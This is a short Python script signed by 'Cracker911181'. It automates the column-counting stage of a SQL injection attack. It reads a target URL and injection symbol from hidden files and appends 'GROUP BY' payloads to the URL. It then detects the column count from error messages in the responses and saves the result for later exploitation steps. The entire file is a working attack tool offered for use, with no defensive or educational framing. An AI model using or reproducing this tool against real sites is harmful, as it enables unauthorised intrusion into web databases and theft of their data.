# Coded by Cracker
# CRACKER911181
 


import requests,sys



#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest



link_file=open(".link.txt","r")
link=link_file.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

smbl1=symbol[0]
smbl2=symbol[1:]

######

print(blue+"\n\n[+]Counting Column\n"+yellow)

#######

colmn=1
for count in range(10):
	
	real_colomn=str(colmn-1)
	colomn=str(colmn)
	print("[=] Now Counting Column : "+real_colomn)
	if smbl1=="'":
		url=str(link+smbl1+"+GROUP+BY+"+colomn+smbl2)
		
		resp=requests.get(url,headers={"User-Agent": "XY"}).text
		
		if "Unknown"  in resp or "Undefined" in resp or "error" in resp or "Error" in resp:
			real_url=str(link+smbl1+"+GROUP+BY+"+real_colomn+smbl2)
			colomn_opn=open(".colomn.txt","w")
			colomn_opn.write(real_colomn)
			colomn_opn.close()
			print(real_url)
			sys.exit()
	
	else:
		url=str(link+"+GROUP+BY+"+colomn+symbol)
		
		resp=requests.get(url,headers={"User-Agent": "XY"}).text
		
		if "Unknown"  in resp or "Undefined" in resp or "error" in resp or "Error" in resp:
			real_url=str(link+"+GROUP+BY+"+real_colomn+symbol)
			colomn_opn=open(".colomn.txt","w")
			colomn_opn.write(real_colomn)
			colomn_opn.close()
			print(real_url)
			sys.exit()
	colmn=colmn+1
	